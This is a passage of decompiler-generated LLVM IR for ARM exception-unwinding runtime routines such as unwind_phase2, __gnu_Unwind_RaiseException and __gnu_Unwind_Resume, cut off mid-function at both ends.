  uselistorder i32 %v2_18320, { 1, 0 }
  uselistorder i32 %v0_18320, { 1, 0 }
  uselistorder i32 %v2_182f4, { 1, 0 }
  uselistorder i32 %v0_18330.pre, { 1, 0 }
  uselistorder i32 %v3_182e0, { 1, 0 }
  uselistorder i32 %v1_18294, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_183f4, { 1, 0 }
  uselistorder label %dec_label_pc_18370, { 1, 0 }
  uselistorder label %dec_label_pc_18320, { 1, 0 }
  uselistorder label %dec_label_pc_18304, { 2, 0, 1 }
  uselistorder label %dec_label_pc_182bc, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1847c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1847c:
  %v0_1847c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1847c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1847c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1847c, %bb
  %v10_18484 = phi i32 [ %arg1, %dec_label_pc_1847c ], [ 0, %bb ]
  ret i32 %v10_18484

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18498 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_184ac = inttoptr i32 %v1_18498 to i32*
  %v2_184ac = load i32, i32* %v1_184ac, align 4
  store i32 %v2_184ac, i32* %r0.global-to-local, align 4
  %v12_184ac = add i32 %entry_vrs, 20
  %v1_184b8 = inttoptr i32 %v12_184ac to i32*
  %v2_184b8 = load i32, i32* %v1_184b8, align 4
  store i32 %v2_184b8, i32* %r0.global-to-local, align 4
  %v12_184b8 = add i32 %entry_vrs, 36
  %v1_184c0 = inttoptr i32 %v12_184b8 to i32*
  %v2_184c0 = load i32, i32* %v1_184c0, align 4
  store i32 %v2_184c0, i32* %r0.global-to-local, align 4
  %v12_184c0 = add i32 %entry_vrs, 52
  store i32 %v12_184c0, i32* @ip, align 4
  %v13_184c4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_184c4, i32* @lr, align 4
  %v1_184c8 = inttoptr i32 %v12_184c0 to i32*
  %v2_184c8 = load i32, i32* %v1_184c8, align 4
  store i32 %v2_184c8, i32* %r0.global-to-local, align 4
  %v9_184c8 = add i32 %entry_vrs, 64
  %v10_184c8 = inttoptr i32 %v9_184c8 to i32*
  %v11_184c8 = load i32, i32* %v10_184c8, align 4
  store i32 0, i32* @r4, align 4
  %v1_184d0 = add i32 %ucbp, 12
  %v2_184d0 = inttoptr i32 %v1_184d0 to i32*
  %v3_184d0 = load i32, i32* %v2_184d0, align 4
  store i32 %v2_184c8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_184e8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_184c8)
  store i32 %v2_184e8, i32* %r0.global-to-local, align 4
  %v0_184ec = load i32, i32* @r6, align 4
  %v1_184ec = load i32, i32* @r4, align 4
  %v9_184ec = icmp eq i32 %v0_184ec, %v1_184ec
  store i32 %v2_184e8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_184ec, label %dec_label_pc_18500, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1850c

dec_label_pc_18500:                               ; preds = %entry
  store i32 %v0_184ec, i32* @r4, align 4
  br label %dec_label_pc_18508

dec_label_pc_18508:                               ; preds = %dec_label_pc_185d0, %dec_label_pc_18500
  br label %dec_label_pc_1850c

dec_label_pc_1850c:                               ; preds = %.thread, %dec_label_pc_18508
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18508 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1850c = icmp eq i32 %v2_184e8, 0
  br i1 %v2_1850c, label %dec_label_pc_18584, label %.thread2.dec_label_pc_18520_crit_edge

.thread2.dec_label_pc_18520_crit_edge:            ; preds = %dec_label_pc_1850c
  br label %dec_label_pc_18520

dec_label_pc_18520:                               ; preds = %.thread2.dec_label_pc_18520_crit_edge, %dec_label_pc_18584
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_18530 = load i32, i32* @r5, align 4
  store i32 %v0_18530, i32* @r3, align 4
  store i32 99648, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_184d0)
  br i1 false, label %dec_label_pc_18548, label %dec_label_pc_18570

dec_label_pc_18548:                               ; preds = %dec_label_pc_18520
  br i1 undef, label %dec_label_pc_18550, label %dec_label_pc_18574

dec_label_pc_18550:                               ; preds = %dec_label_pc_18548
  br i1 undef, label %dec_label_pc_185d0, label %dec_label_pc_18568

dec_label_pc_18568:                               ; preds = %dec_label_pc_18550
  br i1 undef, label %dec_label_pc_185c8, label %dec_label_pc_18570

dec_label_pc_18570:                               ; preds = %dec_label_pc_18520, %dec_label_pc_18568
  br label %dec_label_pc_18574

dec_label_pc_18574:                               ; preds = %dec_label_pc_18548, %dec_label_pc_18570
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18584:                               ; preds = %dec_label_pc_1850c
  store i32 %v11_184c8, i32* @r3, align 4
  %v2_18588 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18588, i32* @r4, align 4
  %v1_1858c = load i32, i32* @r5, align 4
  %v2_1858c = add i32 %v1_1858c, 20
  %v3_1858c = inttoptr i32 %v2_1858c to i32*
  store i32 %v11_184c8, i32* %v3_1858c, align 4
  store i32 %v2_18588, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1859c = call i32 @memcpy()
  %v0_185a4 = load i32, i32* @r6, align 4
  store i32 %v0_185a4, i32* %r0.global-to-local, align 4
  %v0_185a8 = load i32, i32* @r5, align 4
  %v1_185ac = add i32 %v0_185a8, 16
  %v2_185ac = inttoptr i32 %v1_185ac to i32*
  %v3_185ac = load i32, i32* %v2_185ac, align 4
  store i32 %v3_185ac, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_185ac)
  %v0_185bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_185bc, i32* @r4, align 4
  br label %dec_label_pc_18520

dec_label_pc_185c8:                               ; preds = %dec_label_pc_18568
  br label %dec_label_pc_185d0

dec_label_pc_185d0:                               ; preds = %dec_label_pc_18550, %dec_label_pc_185c8
  br label %dec_label_pc_18508

; uselistorder directives
  uselistorder i32 %v11_184c8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 107, 108, 40, 41, 29, 109, 110, 32, 111, 112, 3, 113, 114, 115, 4, 116, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 30, 31, 33, 34, 35, 36, 37, 38, 39, 80, 63, 64, 65, 141, 142, 155, 156, 157, 145, 146, 147, 148, 149, 1, 150, 6, 86, 87, 43, 44, 143, 144, 56, 57, 104, 105, 106, 98, 97, 99, 100, 102, 101, 9, 10, 11, 161, 158, 159, 160, 2, 162, 163, 164, 42, 66, 45, 46, 47, 48, 49, 50, 151, 152, 153, 154, 58, 59, 60, 88, 89, 90, 91, 67, 68, 69, 8, 92, 93, 94, 95, 96, 24, 25, 26, 27, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 28, 51, 52, 53, 103, 54, 55, 61, 62, 70, 7, 71, 72, 73, 74, 75, 76, 77, 78, 79, 81, 82, 83, 84, 85 }
  uselistorder i32 10, { 4, 5, 31, 32, 33, 8, 44, 43, 76, 0, 40, 41, 75, 45, 46, 1, 35, 27, 10, 26, 11, 28, 12, 29, 13, 30, 23, 6, 36, 24, 14, 3, 25, 37, 15, 38, 39, 34, 16, 17, 18, 42, 9, 47, 48, 49, 50, 51, 52, 53, 19, 54, 55, 56, 20, 57, 58, 59, 2, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 7, 73, 21, 74, 22 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_185d0, { 1, 0 }
  uselistorder label %dec_label_pc_18574, { 1, 0 }
  uselistorder label %dec_label_pc_18570, { 1, 0 }
  uselistorder label %dec_label_pc_18520, { 1, 0 }
  uselistorder label %dec_label_pc_1850c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_185e4 = add i32 %ucbp, 12
  %v3_185e4 = inttoptr i32 %v2_185e4 to i32*
  store i32 %stop_fn, i32* %v3_185e4, align 4
  %v3_185e8 = add i32 %ucbp, 24
  %v4_185e8 = inttoptr i32 %v3_185e8 to i32*
  store i32 %tmp, i32* %v4_185e8, align 4
  %v1_185ec = add i32 %entry_vrs, 60
  %v2_185ec = inttoptr i32 %v1_185ec to i32*
  %v3_185ec = load i32, i32* %v2_185ec, align 4
  %v2_185f4 = add i32 %entry_vrs, 64
  %v3_185f4 = inttoptr i32 %v2_185f4 to i32*
  store i32 %v3_185ec, i32* %v3_185f4, align 4
  %v3_185fc = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_185fc

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_186146 = add i32 %vrs, 64
  %v2_186147 = inttoptr i32 %v1_186146 to i32*
  %v3_186148 = load i32, i32* %v2_186147, align 4
  %v2_186189 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_186148)
  store i32 %v2_186189, i32* %r0.global-to-local, align 4
  %v2_1861c11 = icmp eq i32 %v2_186189, 0
  br i1 %v2_1861c11, label %dec_label_pc_18624, label %dec_label_pc_18654

dec_label_pc_18624:                               ; preds = %entry, %dec_label_pc_18624.dec_label_pc_18610_crit_edge
  %v0_18624 = load i32, i32* @r5, align 4
  %v1_18624 = add i32 %v0_18624, 64
  %v2_18624 = inttoptr i32 %v1_18624 to i32*
  %v3_18624 = load i32, i32* %v2_18624, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1862c = load i32, i32* @r4, align 4
  %v2_1862c = add i32 %v1_1862c, 20
  %v3_1862c = inttoptr i32 %v2_1862c to i32*
  store i32 %v3_18624, i32* %v3_1862c, align 4
  %v0_18630 = load i32, i32* @r4, align 4
  %v1_18638 = add i32 %v0_18630, 16
  %v2_18638 = inttoptr i32 %v1_18638 to i32*
  %v3_18638 = load i32, i32* %v2_18638, align 4
  call void @__pseudo_branch(i32 %v3_18638)
  %v0_18644 = load i32, i32* %r0.global-to-local, align 4
  %v7_18644 = icmp eq i32 %v0_18644, 8
  br i1 %v7_18644, label %dec_label_pc_18624.dec_label_pc_18610_crit_edge, label %dec_label_pc_1864c

dec_label_pc_18624.dec_label_pc_18610_crit_edge:  ; preds = %dec_label_pc_18624
  %v0_18610.pre = load i32, i32* @r4, align 4
  %v0_18614.pre = load i32, i32* @r5, align 4
  store i32 %v0_18610.pre, i32* %r0.global-to-local, align 4
  %v1_18614 = add i32 %v0_18614.pre, 64
  %v2_18614 = inttoptr i32 %v1_18614 to i32*
  %v3_18614 = load i32, i32* %v2_18614, align 4
  %v2_18618 = call i32 @get_eit_entry(i32 %v0_18610.pre, i32 %v3_18614)
  store i32 %v2_18618, i32* %r0.global-to-local, align 4
  %v2_1861c = icmp eq i32 %v2_18618, 0
  br i1 %v2_1861c, label %dec_label_pc_18624, label %dec_label_pc_18654

dec_label_pc_1864c:                               ; preds = %dec_label_pc_18624
  %v7_1864c = icmp eq i32 %v0_18644, 7
  br i1 %v7_1864c, label %dec_label_pc_18658, label %dec_label_pc_18654

dec_label_pc_18654:                               ; preds = %entry, %dec_label_pc_18624.dec_label_pc_18610_crit_edge, %dec_label_pc_1864c
  %v0_18654 = call i32 @abort()
  store i32 %v0_18654, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18658

dec_label_pc_18658:                               ; preds = %dec_label_pc_1864c, %dec_label_pc_18654
  %v0_18658 = load i32, i32* @r5, align 4
  %v1_18658 = add i32 %v0_18658, 4
  store i32 %v1_18658, i32* %r0.global-to-local, align 4
  %v1_1865c = inttoptr i32 %v1_18658 to i32*
  %v2_1865c = call i32 @__restore_core_regs(i32* %v1_1865c)
  store i32 %v2_1865c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 6, 8, 7, 4, 5, 1, 9, 0 }
  uselistorder label %dec_label_pc_18658, { 1, 0 }
  uselistorder label %dec_label_pc_18654, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18624, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_18660 = add i32 %ucbp, 20
  %v2_18660 = inttoptr i32 %v1_18660 to i32*
  %v3_18660 = load i32, i32* %v2_18660, align 4
  %v1_18668 = load i32, i32* %r1.global-to-local, align 4
  %v2_18668 = add i32 %v1_18668, 64
  %v3_18668 = inttoptr i32 %v2_18668 to i32*
  store i32 %v3_18660, i32* %v3_18668, align 4
  %v1_1866c = add i32 %ucbp, 12
  %v2_1866c = inttoptr i32 %v1_1866c to i32*
  %v3_1866c = load i32, i32* %v2_1866c, align 4
  %v2_18670 = icmp eq i32 %v3_1866c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1867c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1867c, i32* @r5, align 4
  br i1 %v2_18670, label %dec_label_pc_18684, label %dec_label_pc_186c0

dec_label_pc_18684:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18690 = add i32 %ucbp, 16
  %v2_18690 = inttoptr i32 %v1_18690 to i32*
  %v3_18690 = load i32, i32* %v2_18690, align 4
  call void @__pseudo_branch(i32 %v3_18690)
  br i1 false, label %dec_label_pc_186b8, label %dec_label_pc_186a4

dec_label_pc_186a4:                               ; preds = %dec_label_pc_18684
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_13470.537 to i32))
  %v0_186ac = load i32, i32* @r4, align 4
  %v0_186b0 = load i32, i32* @r5, align 4
  store i32 %v0_186b0, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_186ac, i32 %v0_186b0)
  br label %dec_label_pc_186b8

dec_label_pc_186b8:                               ; preds = %dec_label_pc_18684, %dec_label_pc_186a4
  %v0_186b8 = load i32, i32* @r5, align 4
  %v1_186b8 = add i32 %v0_186b8, 4
  %v1_186bc = inttoptr i32 %v1_186b8 to i32*
  %v2_186bc = call i32 @__restore_core_regs(i32* %v1_186bc)
  %v1_186c4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_186c0

dec_label_pc_186c0:                               ; preds = %entry, %dec_label_pc_186b8
  %v1_186c4 = phi i32 [ %v0_1867c, %entry ], [ %v1_186c4.pre, %dec_label_pc_186b8 ]
  %v3_186c4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_186c4, i32 1)
  %v0_186c8 = call i32 @abort()
  ret i32 %v0_186c8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 46, 47, 48, 49, 50, 52, 21, 18, 19, 20, 14, 15, 16, 22, 23, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 33, 57, 61, 60, 59, 53, 54, 1, 41, 42, 43, 44, 45, 55, 56, 58, 36, 37, 51, 34, 38, 35, 27, 28, 24, 25, 26, 0, 29, 30, 31, 32, 39, 40, 2, 3, 4 }
  uselistorder i1 true, { 0, 1, 2, 3, 97, 140, 4, 141, 142, 143, 144, 5, 83, 116, 145, 6, 82, 146, 7, 81, 147, 148, 149, 150, 8, 151, 117, 9, 85, 152, 10, 84, 153, 154, 11, 155, 156, 157, 12, 158, 159, 13, 160, 14, 119, 161, 162, 118, 163, 164, 15, 86, 16, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 18, 88, 19, 175, 176, 177, 20, 87, 178, 21, 17, 179, 180, 22, 181, 182, 183, 23, 184, 185, 186, 187, 188, 24, 25, 120, 26, 27, 28, 29, 139, 89, 189, 190, 90, 191, 122, 192, 193, 31, 194, 195, 32, 91, 197, 30, 198, 196, 199, 121, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 93, 44, 45, 46, 47, 48, 99, 201, 219, 80, 94, 101, 205, 104, 103, 102, 49, 52, 200, 92, 100, 202, 203, 204, 125, 206, 207, 208, 209, 210, 53, 54, 211, 212, 213, 214, 126, 215, 216, 50, 51, 217, 218, 124, 123, 55, 56, 57, 220, 58, 59, 105, 106, 112, 107, 113, 108, 111, 221, 109, 115, 222, 60, 223, 61, 224, 127, 128, 225, 129, 130, 226, 131, 132, 62, 63, 227, 133, 134, 64, 65, 228, 135, 136, 66, 67, 229, 137, 138, 68, 69, 98, 230, 231, 114, 232, 70, 110, 71, 72, 95, 73, 74, 96, 75, 76, 77, 78, 79 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_186c0, { 1, 0 }
  uselistorder label %dec_label_pc_186b8, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_186cc = load i32, i32* @r4, align 4
  store i32 %v3_186cc, i32* %stack_var_-16, align 4
  %v6_186cc = load i32, i32* @r5, align 4
  %v9_186cc = load i32, i32* @r6, align 4
  %v12_186cc = load i32, i32* @lr, align 4
  %v1_186d0 = add i32 %entry_vrs, 60
  %v2_186d0 = inttoptr i32 %v1_186d0 to i32*
  %v3_186d0 = load i32, i32* %v2_186d0, align 4
  %v2_186d4 = add i32 %entry_vrs, 64
  %v3_186d4 = inttoptr i32 %v2_186d4 to i32*
  store i32 %v3_186d0, i32* %v3_186d4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18704 = load i32, i32* %v3_186d4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1871c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18704)
  %v2_18720 = icmp eq i32 %v2_1871c, 0
  br i1 %v2_18720, label %dec_label_pc_18728, label %dec_label_pc_1875c

dec_label_pc_18728:                               ; preds = %entry
  %v0_18728 = load i32, i32* @r5, align 4
  %v1_18730 = add i32 %v0_18728, 16
  %v2_18730 = inttoptr i32 %v1_18730 to i32*
  %v3_18730 = load i32, i32* %v2_18730, align 4
  call void @__pseudo_branch(i32 %v3_18730)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18748 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1874c = urem i32 %v2_18748, 2
  %v2_1874c = icmp eq i32 %v1_1874c, 0
  br i1 %v2_1874c, label %dec_label_pc_1876c, label %dec_label_pc_18754

dec_label_pc_18754:                               ; preds = %dec_label_pc_18728, %dec_label_pc_1876c
  %v0_18754 = phi i1 [ false, %dec_label_pc_18728 ], [ %phitmp, %dec_label_pc_1876c ]
  br i1 %v0_18754, label %dec_label_pc_18778, label %dec_label_pc_1875c

dec_label_pc_1875c:                               ; preds = %entry, %dec_label_pc_18754
  %v2_18764 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18764, i32* @r4, align 4
  store i32 %v6_186cc, i32* @r5, align 4
  store i32 %v9_186cc, i32* @r6, align 4
  store i32 %v12_186cc, i32* @lr, align 4
  ret i32 9

dec_label_pc_1876c:                               ; preds = %dec_label_pc_18728
  %v2_1876c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1876c, i32* @r0, align 4
  %v1_18770 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1876c)
  %v0_18754.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18754.pre, 6
  br label %dec_label_pc_18754

dec_label_pc_18778:                               ; preds = %dec_label_pc_18754
  %v0_18778 = load i32, i32* @r5, align 4
  %v0_1877c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18778, i32 %v0_1877c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1875c, { 1, 0 }
  uselistorder label %dec_label_pc_18754, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18784 = add i32 %ucbp, 12
  %v2_18784 = inttoptr i32 %v1_18784 to i32*
  %v3_18784 = load i32, i32* %v2_18784, align 4
  %v2_18788 = icmp eq i32 %v3_18784, 0
  br i1 %v2_18788, label %dec_label_pc_18790, label %dec_label_pc_18794

dec_label_pc_18790:                               ; preds = %entry
  %v2_18790 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18794

dec_label_pc_18794:                               ; preds = %entry, %dec_label_pc_18790
  %v1_18794 = add i32 %entry_vrs, 60
  %v2_18794 = inttoptr i32 %v1_18794 to i32*
  %v3_18794 = load i32, i32* %v2_18794, align 4
  %v2_1879c = add i32 %entry_vrs, 64
  %v3_1879c = inttoptr i32 %v2_1879c to i32*
  store i32 %v3_18794, i32* %v3_1879c, align 4
  %v3_187a0 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_187a0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18794, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18800

bb:                                               ; preds = %entry
  %v7_187b8 = mul i32 %regclass, 4
  %v8_187b8 = add i32 %v7_187b8, ptrtoint (i32* @global_var_187c0.694 to i32)
  call void @__pseudo_branch(i32 %v8_187b8)
  br label %dec_label_pc_18800

dec_label_pc_18800:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_188e8 = load i32, i32* @r4, align 4
  %v6_188e8 = load i32, i32* @r5, align 4
  %v2_188f8 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18900 = add i32 %ucbp, 76
  %v2_18900 = inttoptr i32 %v1_18900 to i32*
  %v3_18900 = load i32, i32* %v2_18900, align 4
  %v1_1890c = inttoptr i32 %v3_18900 to i32*
  %v2_1890c = load i32, i32* %v1_1890c, align 4
  store i32 %v2_1890c, i32* @lr, align 4
  %v4_1890c = add i32 %v3_18900, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18918 = urem i32 %state, 4
  store i32 %v1_18918, i32* %r2.global-to-local, align 4
  %v1_1891c = and i32 %state, 8
  store i32 %v1_1891c, i32* %r0.global-to-local, align 4
  %v4_1892c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1890c, i32* %v4_1892c, align 8
  br i1 %v2_188f8, label %dec_label_pc_1893c, label %dec_label_pc_18c18

dec_label_pc_1893c:                               ; preds = %entry
  %v3_1893c = mul i32 %v2_1890c, 256
  store i32 %v3_1893c, i32* %v4_1892c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18954

dec_label_pc_18954:                               ; preds = %dec_label_pc_18c18, %dec_label_pc_1893c
  %v0_18978647090 = phi i32 [ %v2_18c30, %dec_label_pc_18c18 ], [ %v4_1890c, %dec_label_pc_1893c ]
  store i32 %v1_18918, i32* %r2.global-to-local, align 4
  %v1_18958 = add i32 %ucbp, 80
  %v2_18958 = inttoptr i32 %v1_18958 to i32*
  %v3_18958 = load i32, i32* %v2_18958, align 4
  %v7_1895c = icmp eq i32 %v1_18918, 2
  br i1 %v7_1895c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18954
  %v2_18960 = add i32 %ucbp, 56
  %v3_18960 = inttoptr i32 %v2_18960 to i32*
  %v4_18960 = load i32, i32* %v3_18960, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18954, %bb
  %v0_189786470 = phi i32 [ %v0_18978647090, %dec_label_pc_18954 ], [ %v4_18960, %bb ]
  %v1_18964 = urem i32 %v3_18958, 2
  %v2_18964 = icmp eq i32 %v1_18964, 0
  br i1 %v2_18964, label %dec_label_pc_18978.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18a38

dec_label_pc_18978.preheader:                     ; preds = %bb148
  %v1_189786571 = inttoptr i32 %v0_189786470 to i32*
  %v2_189786672 = load i32, i32* %v1_189786571, align 4
  %v2_1897c6874 = icmp eq i32 %v2_189786672, 0
  br i1 %v2_1897c6874, label %dec_label_pc_18a38, label %dec_label_pc_18984.preheader.lr.ph.lr.ph

dec_label_pc_18984.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18978.preheader
  %v7_18988 = icmp eq i32 %id, 2
  %v2_18a14 = icmp eq i32 %v1_18918, 0
  %v2_18be0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18afc = icmp eq i32 %v1_1891c, 0
  br label %dec_label_pc_18984.preheader.lr.ph

dec_label_pc_18984.preheader.lr.ph:               ; preds = %dec_label_pc_18984.preheader.lr.ph.lr.ph, %dec_label_pc_18c4c
  %v1_1899496 = phi i32 [ %v2_189786672, %dec_label_pc_18984.preheader.lr.ph.lr.ph ], [ %v2_1897866, %dec_label_pc_18c4c ]
  %v1_1899093 = phi i32 [ %v0_189786470, %dec_label_pc_18984.preheader.lr.ph.lr.ph ], [ %v2_18c50, %dec_label_pc_18c4c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18984.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_18c4c ]
  br label %dec_label_pc_18984.preheader

dec_label_pc_18984.preheader:                     ; preds = %dec_label_pc_18984.preheader.lr.ph, %dec_label_pc_18c10
  %v1_1899495 = phi i32 [ %v1_1899496, %dec_label_pc_18984.preheader.lr.ph ], [ %v2_18978, %dec_label_pc_18c10 ]
  %v1_1899092 = phi i32 [ %v1_1899093, %dec_label_pc_18984.preheader.lr.ph ], [ %v1_18c10, %dec_label_pc_18c10 ]
  br label %dec_label_pc_18984

dec_label_pc_18984:                               ; preds = %dec_label_pc_18984.preheader, %dec_label_pc_18a28
  %v1_18994 = phi i32 [ %v1_1899495, %dec_label_pc_18984.preheader ], [ %v2_18a2c, %dec_label_pc_18a28 ]
  %v1_189a8 = phi i32 [ %v1_1899092, %dec_label_pc_18984.preheader ], [ %v1_18a28, %dec_label_pc_18a28 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18988, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18984
  %v2_1898c = add i32 %v1_189a8, 4
  %v3_1898c = inttoptr i32 %v2_1898c to i32*
  %v4_1898c = load i32, i32* %v3_1898c, align 4
  store i32 %v4_1898c, i32* @r5, align 4
  store i32 %v1_18994, i32* @r6, align 4
  %v0_18998109 = load i32, i32* @r8, align 4
  %v1_18998110 = add i32 %v0_18998109, 72
